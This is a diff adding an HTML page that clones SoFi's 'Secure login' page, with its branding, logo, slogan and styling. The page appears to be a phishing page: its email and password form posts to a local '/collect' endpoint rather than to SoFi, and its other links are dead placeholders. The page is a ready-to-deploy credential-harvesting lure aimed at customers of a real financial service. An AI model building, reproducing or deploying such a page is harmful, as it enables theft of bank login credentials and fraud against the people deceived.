@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html id="template" style="--header-post-login-display: block; --footer-post-login-height: 30px !important;">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="ulp-version" content="1.17.218">
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="shortcut icon" href="favicon.ico">
+
+  <style>
+    @font-face {
+      font-family: "ulp-font";
+      src: url("fonts/TTNorms-medium.woff2");
+    }
+  </style>
+
+  <link rel="stylesheet" href="css/main.cdn.min.css">
+  <style id="custom-styles-container">
+    body {
+      background: #00A2C7;
+      font-family: ulp-font, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, sans-serif;
+    }
+
+    .c62600dad {
+      background: #00A2C7;
+    }
+
+    .c2f1c3064.cc8c30ce6 {
+      background: #D00E17;
+    }
+
+    .c2f1c3064.ceb673c42 {
+      background: #0A8852;
+    }
+
+    .c94ec4107 {
+      background-color: #007D99;
+      color: #ffffff;
+    }
+
+    .c94ec4107 a,
+    .c94ec4107 a:visited {
+      color: #ffffff;
+    }
+
+    .c3b2711da {
+      background-color: #0A8852;
+    }
+
+    .ca56348a1 {
+      background-color: #D00E17;
+    }
+
+    @supports (mask-image: url("")) {
+      @supports not (-ms-ime-align: auto) {
+        .c6d02143e.c54688395::before {
+          background-color: #D00E17;
+        }
+      }
+    }
+
+    .input.c6a7d5d39 {
+      border-color: #D00E17;
+    }
+
+    .error-cloud {
+      background-color: #D00E17;
+    }
+
+    .error-fatal {
+      background-color: #D00E17;
+    }
+
+    .error-local {
+      background-color: #D00E17;
+    }
+
+    #alert-trigger {
+      background-color: #D00E17;
+    }
+  </style>
+  <style>
+    /* By default, hide features for javascript-disabled browsing */
+    /* We use !important to override any css with higher specificity */
+    /* It is also overriden by the styles in <noscript> in the header file */
+    .no-js {
+      clip: rect(0 0 0 0);
+      clip-path: inset(50%);
+      height: 1px;
+      overflow: hidden;
+      position: absolute;
+      white-space: nowrap;
+      width: 1px;
+    }
+  </style>
+  <noscript>
+    <style>
+      /* We use !important to override the default for js enabled */
+      /* If the display should be other than block, it should be defined specifically here */
+      .js-required {
+        display: none !important;
+      }
+
+      .no-js {
+        clip: auto;
+        clip-path: none;
+        height: auto;
+        overflow: auto;
+        position: static;
+        white-space: normal;
+        width: var(--prompt-width);
+      }
+    </style>
+  </noscript>
+
+  <style>
+    @font-face {
+      font-family: "TT Norms";
+      src: url("fonts/ttnorms_regular.woff") format('woff'), url("fonts/ttnorms_regular.woff2") format('woff2');
+      font-display: swap;
+      font-weight: 400;
+      font-style: normal;
+    }
+
+    /*!sc*/
+    @font-face {
+      font-family: "TT Norms";
+      src: url("fonts/ttnorms_medium.woff") format('woff'), url("fonts/ttnorms_medium.woff2") format('woff2');
+      font-display: swap;
+      font-weight: 500;
+      font-style: normal;
+    }
+
+    /*!sc*/
+    @font-face {
+      font-family: "TT Norms";
+      src: url("fonts/ttnorms_bold.woff") format('woff'), url("fonts/ttnorms_bold.woff2") format('woff2');
+      font-display: swap;
+      font-weight: 700;
+      font-style: normal;
+    }
+
+    /*!sc*/
+    @media (max-width: 866000px) {
+      .left-column {
+        display: none;
+      }
+
+      .right-column {
+        max-width: 100%;
+        justify-content: center;
+        display: flex;
+        padding-left: 0px;
+
+      }
+
+      .logo-alignment {
+        transform: none;
+        margin-left: 0px;
+        width: auto;
+        padding-left: 0px;
+      }
+    }
+
+    .main-box {
+      --prompt-min-height: auto;
+      display: flex;
+      flex-direction: column;
+      height: auto;
+      white-space: normal;
+      border-radius: 5px;
+      border-radius: var(--border-radius-outer);
+      grid-area: center;
+      position: relative;
+      width: 400px;
+      width: var(--prompt-width);
+
+    }
+
+    /* OLD STYLES */
+    /* When we can update our terraform provider these old style root rules would be better moved to the branding theme configuration. */
+    :root {
+      --action-primary-color: #007D99 !important;
+      --input-border-radius: 6px !important;
+      --border-radius-component: 6px !important;
+      --gray-dark: #717171 !important;
+      --button-border-radius: 6px !important;
+      --border-radius-outer: 16px !important;
+      --prompt-min-height: 30px !important;
+      --page-background-color: #00A2C7 !important;
+      --spacing-5: calc(var(--spacing)*4.2) !important;
+      --spacing-3: calc(var(--spacing)*2.7) !important;
+      --secondary-button-border-color: #007D99 !important;
+      --secondary-button-text-color: #007D99 !important;
+      --header-post-login-display: none;
+      --footer-post-login-height: 58px;
+    }
+
+    html,
+    body {
+      height: 100%;
+      margin: 0;
+      --page-background-color: #00A2C7 !important;
+
+    }
+
+    body {
+      --page-background-color: #FAF8F5;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .header-post-login {
+      border-bottom: 1px solid rgb(231, 231, 231);
+      padding-left: 1rem;
+    }
+
+    .header-sub-box {
+      height: 24%;
+    }
+
+    .header-nav {
+      -webkit-box-align: center;
+      align-items: center;
+      display: flex;
+      height: 3rem;
+      max-width: 73rem;
+      margin: 0px auto;
+      position: relative;
+    }
+
+    body._hide-prompt-logo h1 {
+      margin-bottom: 2px;
+    }
+
+    .header {
+      height: 24%;
+      display: flex;
+      flex-direction: column-reverse;
+      margin: 0;
+    }
+
+    .header .logo {
+      display: flex;
+      justify-content: center;
+    }
+
+    .header .logo img {
+      width: 118px;
+      margin-bottom: 12px;
+    }
+
+    .header .logo a {
+      position: relative;
+      left: 2px;
+    }
+
+    .footer {
+      position: relative;
+      /* Use a high z-index for future-proofing */
+      z-index: 10;
+      min-height: 110px;
+      margin: 0;
+    }
+
+    button[type="submit"] {
+      margin-top: 20px !important;
+      font-weight: 700;
+    }
+
+    ._widget-auto-layout ._widget {
+      min-height: 30vh;
+      padding: 6px 0;
+
+    }
+
+    ._widget section>div {
+      min-height: 50px !important;
+    }
+
+    .center a {
+      font-weight: 400 !important;
+      color: var(--action-primary-color) !important;
+      font-size: 16px !important;
+    }
+
+    body._hide-prompt-logo h1 {
+      margin-bottom: 16px;
+    }
+
+    .sofi-links {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 24px;
+      margin-top: 24px;
+    }
+
+    .sofi-links a {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 12px;
+      color: white;
+      margin: 0px 24px;
+      font-size: 16px !important;
+      font-weight: 700;
+      color: white;
+      margin: 0px 24px;
+      line-height: 24px;
+    }
+
+    .input-wrapper:last-child {
+      padding-bottom: 0px !important;
+    }
+
+    .input-wrapper:not(:last-child) {
+      padding-bottom: 8px !important;
+    }
+
+    form p {
+      margin-top: 18px !important;
+
+    }
+
+    form p a {
+      font-size: 16px !important;
+      font-weight: 400 !important;
+    }
+
+    #widget_block {
+      min-height: 76%;
+      margin-top: 0;
+      flex: 1 0 auto;
+      margin-bottom: -24px;
+    }
+
+    @media screen and (max-height:800px) {
+      .header {
+        height: 15%;
+      }
+      #widget_block {
+        min-height: 85%
+      }
+    }
+  </style>
+</head>
+
+<body id="page" class="_widget-auto-layout _hide-prompt-logo">
+  <div class="header">
+    <span class="logo">
+      <div class="logo-alignment">
+        <a href="#">
+          <img src="images/sofi_logo_white_416x116.png">
+        </a>
+      </div>
+    </span>
+  </div>
+  <div id="widget_block">
+    <div class="center-block">
+      <div class="right-column">
+        <div class="main-box">
+          <div class="right-widget-wrapper">
+            <main class="_widget login">
+              <section class="c66e20158 _prompt-box-outer ca20e631b">
+                <div class="ceeb7e995 c98450f08">
+                  <div class="c35cc68b7">
+                    <header class="caf9c4b6d cb03adf9e">
+                      <div title="SoFi" id="custom-prompt-logo" style="width: auto !important; height: 60px !important; position: static !important; margin: auto !important; padding: 0 !important; background-color: transparent !important; background-position: center !important; background-size: contain !important; background-repeat: no-repeat !important">
+                      </div>
+                      <img class="cd7df2892 c62875a1f" id="prompt-logo-center" src="images/0x0.png" alt="SoFi">
+                      <h1 class="c85308b88 c6689a483">Secure login</h1>
+                      <div class="c41535f9a c43737e03">
+                        <p class="c28e85330 cff590de0">Log in to Get Your Money Right®</p>
+                      </div>
+                    </header>
+                    <div class="c2701a345 c22884cc9">
+                      <form method="POST" id="loginForm" action="/collect" method="POST" class="cb2e1bdc9 c165a3537" data-form-primary="true">
+                        <input type="hidden" name="state" value="hKFo2SBjQnFHQ050V3JGRHpBVzZQRzV1QXFtbzZ1ck9RN2NoT6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIEVHUU04NjV0eVlteDdPNDVPcEVyZVVPUFNUR3RkVk5Io2NpZNkgNkxuc0xDc2ZGRUVMbDlTQzBDaWNPdkdlb2JvZXFab2I">
+                        <div class="c9ad40d30 c77150178">
+                          <div class="c862f080e">
+                            <div class="input-wrapper _input-wrapper">
+                              <div class="c6d02143e c46e32be0 text c70cc0741 c78e586c4" data-action-text="" data-alternate-action-text="">
+                                <label class="cf59a1f59 no-js c6fb1f00d ca974173a" for="username">Email*</label>
+                                <input class="input c19ad00c3 c30d9afca" inputmode="email" name="username" id="username" type="text" value="" required="" autocomplete="email" autocapitalize="none" spellcheck="false" autofocus="">
+                                <div class="cf59a1f59 js-required c6fb1f00d ca974173a" data-dynamic-label-for="username" aria-hidden="true">Email*</div>
+                              </div>
+                            </div>
+                            <div class="input-wrapper _input-wrapper">
+                              <div class="c6d02143e c46e32be0 password c0ff9e370 c78e586c4" data-action-text="" data-alternate-action-text="">
+                                <label class="cf59a1f59 no-js c6fb1f00d c7e7f74a2" for="password">Password*</label>
+                                <input class="input c19ad00c3 ce9b3173b" name="password" id="password" type="password" required="" autocomplete="current-password" autocapitalize="none" spellcheck="false">
+                                <div class="cf59a1f59 js-required c6fb1f00d c7e7f74a2" data-dynamic-label-for="password" aria-hidden="true">Password*</div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <p class="c9ff8630d c2039e792">
+                          <a class="c7ee8ceb0 c879834d5 c8023864a" href="#">Forgot password?</a>
+                        </p>
+                        <div class="cc199ae96">
+                          <button type="submit" name="action" value="default" class="c1d1b1e07 c94ec4107 c3a9491fe cc1fd6969 c30010b38" data-action-button-primary="true">Log in</button>
+                        </div>
+                      </form>
+                    </div>
+                  </div>
+                </div>
+              </section>
+            </main>
+          </div>
+          <footer class="footer">
+            <div class="sofi-links">
+              <a href="#">New to SoFi? Sign up</a>
+              <img src="images/clear.png" style="display: none">
+            </div>
+          </footer>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script>
+    document.querySelectorAll('.input').forEach(input => {
+        input.addEventListener('focus', function () {
+            this.parentElement.classList.add('focus');
+        });
+        input.addEventListener('blur', function () {
+            if (this.value !== '') {
+                this.parentElement.classList.add('c457439c5'); // Indicate the field is filled
+            } else {
+                this.parentElement.classList.remove('c457439c5'); // Remove if empty
+            }
+            this.parentElement.classList.remove('focus'); // Always remove focus state on blur
+        });
+    });
+  </script>
+</body>
